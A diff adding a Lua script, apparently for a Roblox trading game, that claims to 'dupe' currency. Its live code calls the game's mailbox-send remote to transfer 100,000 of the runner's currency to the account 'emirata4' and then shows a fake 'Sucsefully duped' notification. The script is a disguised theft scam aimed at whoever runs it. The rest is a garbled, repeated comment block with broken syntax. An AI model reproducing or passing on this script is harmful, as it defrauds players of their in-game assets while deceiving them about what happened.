@@ -1,0 +1,162 @@
+local args = {
+    [1] = "emirata4",
+    [2] = "LOOOOL",
+    [3] = "Currency",
+    [4] = "e4f9bb5c02eb445c85e049acb7039363",
+    [5] = 100000
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10
+})
+
+--[game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Sucsefully duped",
+    Text = "Wait 5 minute for delivery",
+    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150",
+   Duration = 10]
